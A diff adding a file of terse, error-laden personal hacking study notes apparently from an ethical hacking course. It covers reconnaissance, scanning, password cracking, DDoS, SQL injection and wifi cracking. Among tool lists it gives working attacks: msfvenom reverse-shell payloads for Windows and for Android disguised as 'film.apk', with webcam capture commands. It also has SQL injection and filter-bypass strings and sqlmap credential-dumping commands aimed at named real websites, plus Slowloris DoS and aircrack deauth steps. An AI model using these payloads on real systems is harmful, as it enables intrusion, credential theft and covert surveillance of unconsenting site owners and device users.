@@ -1,0 +1,1026 @@
+threat
+vulnerablity
+target
+doxing
+exploit
+shell
+
+bag(0day public)
+botner
+cve commont vul and exposures
+trojan key kloger rat
+
+why we need know secu
+cia(conf in ava
+
+func secu ease of use
+
+no 100 secu
+
+bars during years
+
+attack
+target=tech+vul
+
+info sec threats
+natral physical human
+bar about
+
+hacker
+hactivism social gov poli amuse
+
+types
+black grey white
+
+hacker and cracker
+cracker use knowldge of hacker
+
+procedure
+footprinting
+scaninig
+gaining access
+maintaing acce
+covering track remove foot sign of arrackk
+
+ceh and hacking
+make a contract
+
+needs of ceh
+network
+os
+vul
+sec
+vuln code
+make solu
+
+proc of ceh
+speak
+cont
+info gath
+pentest
+anal
+gozarish
+
+type of attack ceh
+remote net
+local net
+stolenequipment
+social en
+phy
+
+
+threat modeling
+
+eisa enter inf sec arch
+
+type vul
+low medium high
+
+exploitation
+local remote
+
+sites
+exploit-db.com
+cxsecurity.com
+
+
+footprinting
+information gathering
+1-internet footprinting
+2-website footprinting:nmap, zenmap, paros proxy, burp suite
+mirroring website:download site:
+blackwidow, page nest, ncollector studio, backstreet brrowser, website ripper copier, offline explorer enterprise
+
+monitoring web update:
+change detection,on web change, follow that change, infominder, page2rss, tracked content
+
+e-mail footprinting:
+email tracking pro, yesware, zendio, contact monkey, point of mail, read notify, who read me
+
+whois footprinting:
+gathering ip dns:whois.net   network-tool.com
+
+dns footprinting:
+dig
+dns watch
+my dns tools
+professional toolset
+dns query utility
+dns data view
+
+network footprinting:
+tracerout: magic net trace, geo spider, neo trace, path analyzer pro
+
+social enginiring:
+maltego
+recon-ng
+foca
+prefix whois
+netmask
+net scan tools pro
+binging
+tctrace
+search bug
+autonomous system scanner
+
+google hacking:
+filetype
+intitle
+intext
+inurl
+site
+info
+cache
+link
+related
+
+example: dork
+site:learnfile.com php
+inurl:learnfile.com kaly 
+inurl:news php?id=
+inurl:admin/index.php
+intext:learnfile.com gaming
+intext:learnfile.com "gaming" for specefied
+intitle:android
+filetype:pdf cracking with python
+filetype:ppt ceh
+relate:facebook     like this site
+info:android    get info
+link:learnfile.com   link this site
+site:.us inurl:news php?id=
+intitle index of mp3 murteza pashaee
+inurl:viewerframe?mode=motion
+exploit-db: site for dork
+
+whois:
+godady.com
+
+
+whois.sc lookup:site for whois
+yougetsignal:site for whois
+alexa.com: search for rate of a site
+https://www.websiteiq.com
+https://www.similarweb.com/top-websites/
+web server:
+litehtppd
+nginx
+litespeed
+apache
+iis
+
+
+
+scaning:
+ip scan
+vulnerablilty scan
+port scan
+
+scanners:
+nmap
+wireshark
+ettercap
+kismet
+cain
+angry ip scanner
+
+port scanner:
+netifera
+nmap
+nscan
+
+site scan:
+xscan
+vega
+openvas
+nikto
+accountix
+nessus
+netsparker
+was3f
+
+bug:
+low 
+meddium
+high
+
+
+nmap:
+nmap ip    scan spec ip
+nmap sitename.com   scan a host
+nmap 192.168.1.1-20      scan a range of ips
+nmap 192.168.1.1/24      scan a subnet
+nmap -il filesite.txt   scan list
+nmap -p 23 site         scan a speci port
+nmap -p 1-1023 ip        scan a speci port
+nmap -F ip             scan 100 most common port
+nmap -A ip             scan os and service
+nmap -sV ip            scan standars service 
+nmap -sV --version-intensity 5 ip  aggressive service detection
+nmap -oN outputfile.txt ip     save
+
+
+vulnerablity scan:
+vega
+accountix
+netsparker
+www.lacosteparfumsgift.com
+
+
+enumeration:
+send some packet to victem for getting info
+getting email and name of user
+getting info using def pass
+bruteforcing
+getting info using from win
+
+netbios:
+recognizing device over tcp/ip
+list of pc
+list of shared file and hosting net
+policy and passwords
+
+super scan
+hyena
+winfingerprint
+netbios enumerattion
+pstools
+
+snmp enumeration:
+getting accounts and info
+opUtils
+engineers toolset
+snmp scanner
+getif
+snscan
+
+
+ntp enumeration:
+ntp enumeration
+wireshark
+atomSync
+ntp query
+presen tense ntp audito
+
+dns enumeration:
+dnsmap, maltego
+   
+network:
+ping,port, ip ssl
+
+ping:
+os(ttl<100:linux) ip load(-t)
+
+port:
+65535
+tcp&udp
+port list
+1024 registered port
+1025-49151 welknown
+49152-65535   free
+
+netstat -an   port in a sys
+
+ip,ssl:
+public
+private
+
+https
+
+
+system hacking:
+cracking pass
+sniff,mitm,trojan
+
+see pass
+dumpster 
+social engineering
+
+crack technique:
+dictionary attack
+brute force
+knowing pass
+
+site for default pass
+
+good pass:
+a A @ 1
+ 
+
+sam file:
+c:win:system32:config
+pwdump
+
+hash:
+shadow salt vb wp md4 md5 sha
+
+pass crack app:
+ophcrack,pwdump, paasswordspro, cain&abel, lcp,john the ripper, rainbowCraCK
+
+HOW PROVENT FROM CRACKING:
+12 character
+1 month
+dont use default pass
+dont use date of birth
+dont use save in browser
+
+excution application:
+spyware, rat,keylogger, trojan, backdoors
+
+keylogger:
+softwrae and hardware
+
+app:
+advanced keylooger, micro keylogger,actual spy, key prowler, kid logger, spy tector, spy keylogger, powered keylogger
+
+ 
+mac keylogger:
+aobo mac os x keylogger
+perfect keylogger for mac
+award keylogger for mac
+refog keylogger
+mac log manager
+
+spyware:
+link
+download
+email
+
+app:
+refog employee monitor
+eBLASTER
+SSPro
+iprotect you pro
+spytech sentry pc
+
+
+provent tech:
+antivireus
+firewall(komodo)
+email fake
+close unused usb port
+
+anti keylogger:
+zemana antilogger
+anti-keylogger
+co defender
+
+
+
+antispyware soft:
+super anti spyware
+xoft spy anti spyware
+kaspersky internet security
+spy sweeper
+
+rootkits:
+hide existence of hacker in system
+get root provilige
+
+
+anti rootkits app"
+virus removal tool
+rootkit buster
+win detect
+tdss killer
+prevx
+
+stegnography:
+hiding a file to another file
+stegdetect
+xstegsecret
+stegspy
+steganalyzeras
+steg suite
+
+
+delete log:
+ccleaner
+mru-blaster
+wipe
+tracks eraser pro
+clear prog
+wintools.net
+window washer
+privacy eraser
+
+
+hash cracker site:
+www.md5.cx
+www.md5hashgenerator.com
+hashkiller.co.uk
+md5 cracker
+
+
+attack on win:
+metaxploit
+msfconsol
+
+pico file for transfering file
+
+msfvenom -p windows/meterptrter/reverse_tcp lhost=192.168.84.130 kaly ip  lport=4444 -f exe>/root/Desktop/file.exe
+
+msfvenom -p windows/meterptrter/reverse_tcp --plateform windows  -a x86 lhost=192.168.84.130 kaly ip  lport=4444 -f exe -o /root/Desktop/file.exe
+use exploit/multi/handler
+192.168.107.3
+show option
+set payload windows/meterpreter/reverse_tcp
+set lohost kaly ip
+set lport 4444
+expolit
+
+when getting access:
+help
+shell
+
+
+scan file for virus:
+scan total site
+meta defender site
+virus jotti
+
+proccess explorer a soft for detect virus
+
+
+ 
+
+Maleware:
+like trojan, virus, worm,spyware,botnet,
+
+enterring maleware:
+usb,email
+
+
+trojan:
+port it like list
+
+
+crypter:
+soft that make trojan hide
+
+virus:
+make pc useless
+
+
+baj afzar:
+you should get money for that
+
+
+worm:
+it spread itself in pcs
+
+
+jps virus cretor:
+creating viurs
+
+
+
+sniffing:
+monitoring someone
+
+passive sniff
+active sniff
+
+protocol:
+macflooding
+dhcpattack
+dnspoinsining
+switchportstealing
+arppoinsing
+spoofingattack
+
+
+tools:
+wireshark
+kismet
+net stumbler
+dsninff
+ettercap
+smart sinff
+eherape
+ntopng
+commen virw
+
+
+ettercap:
+ettercap -G for graphic form
+
+
+social engineering:
+recongnizing fake page:
+https
+ssl
+
+social engineering toolkit
+run service apache
+var www http
+1
+2
+3
+2
+
+
+dos/ddos:
+bandwidth
+service request flooad
+syn
+p2p
+phlashing
+app level flood
+icmp flood
+smurf
+botnet
+
+
+tool:
+scripts
+websploit(use webkiller) target run
+slowlories(chmod +x slowlories)
+perl slowlories.p ip -dns -port 80 -timeout -1 num 1000 -cache
+
+
+protection app:
+fortdurd anti ddos firewall
+incpsula
+forti ddos
+anti ddos guardian
+defense pro
+ddos defend
+netflow analyzer
+
+
+
+session hijacking:
+tech
+brute force
+stealing
+
+
+diff between spoofing and session hijack:
+spoof: hacker he is another person
+hijack:make a session
+
+
+zaproxy, burp suite, jhijack, surf jack, ettercap, tamper ie, cookie catcher
+
+android:
+droid sniff, droid sheep
+
+
+web server attack:
+
+apache
+nginx
+lis
+lite speed
+google service
+
+
+attack over web server:
+dos/ddos
+dns server hijacking
+directory tranersal
+phishing attack
+website defacement(changing face of site)
+web server misconfiguration
+pass cracking attack
+web application attack(xss,sql injection,css)
+
+bug:
+rfu, rfi, lif, csrf, xss, sql. fck,cms, html injection, xml, webdav
+
+
+
+scan app:
+nikto, wikto, accountix, nessus, wa3f, vega
+,nscan, dvwa, openvas
+
+
+shell:
+alfa, c100, c99, b374k, r57, n57,shell asp
+
+
+nikto:
+nikto -help
+nikto -h site
+
+wapiti:
+wapiti site 
+
+uniscan:
+uniscan -u site -j
+
+
+whatweb:
+whatweb -v site
+
+
+shell:
+alpha
+b374k
+
+
+
+zine-h.org  sote for saving hack
+
+
+
+sqlinjection:
+union php
+error asp
+blind sql
+
+
+tools:
+marathon tool
+havij
+sql brute
+sql ninja
+sqlmap
+droid sqli
+sql map chik
+
+dork:
+inurl:News.php?id=
+inurl:pages.php?id=
+my own
+http://www.shihka.com.hk/en/product.php?catid=-2+/*!50000union*/+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+
+
+
++order+by+10000--  for column
+'+order+by+10000--+ for bypassing
+
+
+for finding collumn vulnerable
+union+select+1,2,3,4,5,6--
+-2+union+select+1,2,3,4,5,6--
+-2+union+select+1,2,version(),4,5,6--
+version()
+Database()
+
+getting admin table:
+group_concat(table_name).....+from+information_schema.table+where+table_schema=database()---
+
+
+-2+union+select+1,2,group_concat(table_name),4,5,6+from+information_schema+where+tabletable_schema=database()--+
+hackbar:
+add-ons
+
+http://greenwall.org/recent-news.php?id=16
+
+http://coreworld.in/news.php?id=382
+http://naspschools.org/news/news.php?id=1392
+
+
+
+table admin tst:
+http://hof-ottmann.de/index-detail.php?id=4
+
+http://www.redmountainopenfarm.ie/news-details.php?id=95
+
+http://www.sonicmayhem.com/news.php?id=12
+
+http://www.caajaykagrawal.com/page.php?id=1
+
+http://www.wilbermanufacturing.com/product_catagory.php?catid=4
+
+http://pch.workshop.com/memberinfo.php?id=10
+
+
+
+
+getting info fro admin table:
+group_concat(column_name).....+from+information_schema.column+where+table_name=hex table name--
+
+column-columns-name-name table be soorat hex
+
+ 
+superating user and pass:
+0x3a
+
+br:
+E62723C3x0
+hackbar:
+add-ons
+
+getting table admin:
+-2+union+select+1,2,group_concat(column_name),4,5,6+from+information_schema.columns+where+table_name=admin table hex--+
+
+
+getting table admin:
+-2+union+select+1,2,group_concat(admin,pass),4,5,6+from+tb_admin--+
+
+
+
+hash:
+hash creator
+hash killer
+
+
+login page:
+site:site name login
+wordpress:wp-login.php
+joomla:adminstrator
+dirctory finder app find admin page
+accountix
+
+
+bypass:
+'order+by--+
+group concate
+www.vehicledynamicsinternational.com/news.php?NewsID=38720+union+select+1,2,3,4,5,6,Unhex(hex(group_concat(table_name))),8,9,10+from+information_schema.tables+where+table_schema=database()--
+
+bypass not acceptable:
+/*!50000*/
+/*select50000!*/
+/*group_concat(table_name)50000!*/
+/*from50000!*/
+
+http://www.formsintl.com/news-full.php?id=21
+
+http://www.sds.net.br/negocios/detalhes.php?cod=66
+
+http://www.3rtechnologies.net/mobile.php?id=1
+
+
+
+http://www.formsintl.com/news-full.php?id=-21+/*!50000union*/+select+1,2,3,4,5,6,7,8,9,10,11,12,(group_concat(table_name)+from+information_schema.tables+where+table_schema=database()--
+
+http://www.formsintl.com/news-full.php?id=-21+/*!50000union*/+/*!50000select*/+1,2,3,4,5,6,7,8,9,10,11,12,/*!50000gRoup_concat(table_name)*/+/*!50000frOm*/+information_schema.tables+where+table_schema=database()--
+
+
+bypass admin page:
+or'a'=a'
+# or 0=0'
+--or 1=1"
+or "x"="x"
+--or 1=1
+--or a=a'
+site:.....inurl:/admin
+inurl:/login
+inurl:admin
+inurl:login
+
+
+hrrp://www.radiomargensdovez.pt/admin/login.php
+http://radioonix.com/admin/login.php
+
+
+sqlmap:
+sqlmap -u http://esmsite.com/php?id=16 --dbs
+
+sqlmap -u http://esmsite.com/php?id=16 -D databasename --table
+
+sqlmap -u http://esmsite.com/php?id=16 -D db-T admin --colums
+
+sqlmap -u http://esmsite.com/php?id=16 -D db-T admin -C user --dump
+
+sqlmap -u http://esmsite.com/php?id=16 -D db-T admin -C pass --dump
+
+
+http://koskimit.ru/new_building.php>id=137
+
+kaly course:
+php?id=
+sqlmap -u http://mysecs.org/study-abroad-detail.php?id=63 --dbs
+
+sqlmap -u http://mysecs.org/study-abroad-detail.php?id=63 -D mysecs_db
+
+sqlmap -u http://mysecs.org/study-abroad-detail.php?id=63 -D mysecs_db --tables
+
+sqlmap -u http://mysecs.org/study-abroad-detail.php?id=63 -D mysecs_db -T login --columns
+
+sqlmap -u http://mysecs.org/study-abroad-detail.php?id=63 -D mysecs_db -T login -C paswd --dump
+ 
+
+wirelss:
+gsm
+hotspot
+bandwidth
+accesspoint
+bssid
+
+
+802.11
+
+benfit
+
+problem
+
+standards
+
+
+antenna:
+omni
+semiDirectional
+Directional
+
+
+algorithm
+wep
+wpa
+wpa2
+
+
+threats
+crack
+sniff
+ddos
+
+rogue ap
+
+
+wifi discovery tools:
+insider
+net surveyor
+vistumbler
+net stumbler
+wireless mon
+kismet
+wifinder
+
+traffic analyezer:
+wireshark
+
+crack tool:
+wep attack
+wessside-ng
+reaver-pro
+wep crack
+cain&abel
+wifite
+
+
+provent hacking wireless:
+change ssid
+change pass and user
+mac filtering
+hide ssid
+use wpa3
+unenable wps
+
+
+crunch:
+crunch 1 4 -o /root/Desktop/wordlist.txt
+crunch 1 4 a\@\2\h -o /root/Desktop/wordlist.txt
+crunch 1 4 abc -o /root/Desktop/wordlist.txt
+crunch 1 4 "abc" -o /root/Desktop/wordlist.txt
+crunch 2 2 -t a^ -o /root/Desktop/wordlist.txt 
+crunch 2 2 -t a@ -o /root/Desktop/wordlist.txt
+crunch 2 2 -t a% -o /root/Desktop/wordlist.txt
+
+crunch 11 11 021%%%%%%% -o /root/Desktop/wordlist.txt
+crunch 3 3 % -l ah% -o /root/Desktop/wordlist.txt
+
+crunch 2 2 bbb -o /root/Desktop/wordlist.txt
+
+crunch 2 2 -s bbb -o /root/Desktop/wordlist.txt
+
+
+aircrack:
+airmon-ng
+airmon-ng start wlan0
+airodump-ng mon0
+airodump-ng -w esm -c channel -bssid mac mon0
+
+open a new terminal
+airplay-ng -1 0 -a mac
+airplay-ng -3 -b mon0 mac
+250,000
+ctrl+c
+
+aircreack-ng name of -w(esm)
+
+wifite:
+wifite --wep
+wifite --wep --wps
+
+
+fern-wifi-cracker:
+
+
+gerix wifi cracker:
+
+
+wpa with aircrack:
+airmon-ng
+airmon-ng start wlan0
+airodump-ng mon0
+
+choose your network
+airodump-ng -w capture -bssid mac -c channel mon0
+
+get hanhshek
+aireplay-ng --deauth 1 -a mac -c client mac mon0
+aircrack capture-01.cap -w /root/Desktop/file.txt
+
+
+reaver: for wps
+airmon-ng
+airmon-ng start wlan0
+airodump-ng mon0
+wash --help
+
+
+hacking mobile plateform:
+msfvenom -p android/meterpreter/reverse_tcp lhost=ip of kaly lport=4895 R > /root/film.apk
+
+
+metasploit:
+use exploit/multi/handler 
+
+
+msvenom -p android/meterpreter/reverse_tcp lhost=ip of kaly lport=4895 > /root/film.apk
+
+apt-get update
+
+use exploit/multi/handler
+android/meterpreter/reverse_tcp
+set lhost ip of kaly
+exploit
+
+webcam_snap 
+webcam_stream
+
+
+ids-firewall and honypot:
+
+firewall:
+work with port
+soft and hard form
+
+types of firewall:
+packet filtering firewall
+circuit level gateway (check session)\
+Application level gateway(called proxy filter in app layer)
+
+statefull(check network) cmd(netstat -an) 
+
+
+dmz:
+
+
+honeypot:
+fake session
+
+snort:
+check traffic
+
+
+attack recon app:
+tipping point
+peek & spy
+cisco ips
+silver sky
+ngips
+
+
+firewall app:
+zone alarm
+comodo firewall
+asa firewall
+fortigate
+
+honeypot tools:
+KFSensor
+specter
+honey bot
+kojoney
+win honeypot
+
+ids hack:
+insertion
+dos
+sessionsplicing
+falsePositive
+TTL Attack
+
+
+
+cloud computing:
+IAAS
+SAAS
+PAAS
+
+
+private cloud:
+public cloud
+hybrid cloud
+community cloud
+
+
+virtualiation:
+vmware
+virtual box
+parllel Desktop
+hyper-v
+
+
+security tools for cloud:
+core cloud inspect
+cloud passage halo
+alert logic
+secludit
+porticor
+
+
+
